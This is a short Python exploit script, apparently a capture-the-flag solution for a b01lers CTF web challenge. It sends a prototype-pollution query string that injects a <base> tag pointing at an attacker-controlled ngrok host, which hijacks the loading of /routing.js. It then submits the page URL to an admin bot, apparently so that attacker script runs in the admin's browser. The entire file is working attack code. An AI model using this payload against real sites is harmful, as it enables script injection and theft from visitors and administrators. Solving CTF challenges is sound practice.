import requests

url = "https://no-code-8832c16b1061fe57.instancer.b01lersc.tf"
admin_url = "https://nocode-admin.harkonnen.b01lersc.tf"
#url = "http://host.docker.internal:8000"
#admin_url = "http://host.docker.internal:8001"
attacker_url = "https://3961-129-80-25-148.ngrok-free.app"

print(
	requests.get(
		url +
		# proto pollute children to create a <base> tag to hijack /routing.js
		"/?__proto__[children][0][tag]=base"
		f"&__proto__[children][0][attributes][href]={attacker_url}"
		# stop recursive proto pollution
		"&__proto__[children][0][children]="
		# make children get treated as array-like
		"&__proto__[children][length]=1"
	).text
)

print(requests.get(url + "/page?page=index").text)

print(requests.post(admin_url, data={"url": url}))
